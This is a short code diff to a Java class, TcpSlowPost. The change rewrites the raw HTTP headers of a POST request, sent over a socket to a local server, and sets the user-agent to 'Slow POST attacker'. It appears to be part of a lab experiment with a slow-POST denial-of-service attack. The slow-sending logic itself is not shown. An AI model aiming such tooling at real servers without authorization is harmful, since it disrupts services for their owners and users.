@@ -19,10 +19,17 @@ public class TcpSlowPost {
             PrintWriter pw = new PrintWriter(s.getOutputStream());
 
             pw.println("POST /users HTTP/1.1");
-            pw.println("Host: 192.168.1.3:3000");
-            pw.println("Content-Type:application/json");
-            pw.println("Cache-Control: no-cache");
+            pw.println("content-type: application/json");
+            pw.println("cache-control: no-cache");
+            pw.println("user-agent: Slow POST attacker");
+            pw.println("accept: */*");
+            pw.println("host: 192.168.1.3:3000");
+            pw.println("accept-encoding: gzip, deflate");
+//            pw.println("content-length: 30");
+            pw.println("connection: keep-alive");
             pw.println("");
+
+//            pw.println("{messi: jora, age: 30}");
             String postObject = gson.toJson(new User("Messi", 40));
             System.out.println("Post obj: " + postObject);
             pw.println(postObject);
